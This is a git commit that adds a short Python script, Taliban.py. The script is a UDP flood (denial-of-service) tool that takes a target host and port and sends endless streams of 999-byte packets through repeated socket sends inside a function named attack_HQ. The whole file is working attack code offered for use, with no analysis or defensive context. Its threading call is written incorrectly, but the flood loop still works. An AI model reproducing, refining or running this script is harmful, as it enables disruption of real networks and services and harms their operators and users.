42c8398f555abf75f5592c0b0b209ab3e7288fb9
Khan <KhanTheTalisman@gmail.com>
2024-08-16 13:56:42 +0300

    Add files via upload

---
+++ Taliban.py
@@ -0,0 +1,22 @@
+import sys
+import socket
+import threading
+
+host = str(sys.argv[1])
+port = int(sys.argv[2])
+
+loops = 999999
+
+def send_packet(amplifier):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.connect((str(host), int(port)))
+        while True: s.send(b"\x99" * amplifier)
+    except: return s.close()
+
+def attack_HQ():
+        for sequence in range(loops):
+            threading.Thread(target=send_packet(999), daemon=True).start()
+
+attack_HQ()
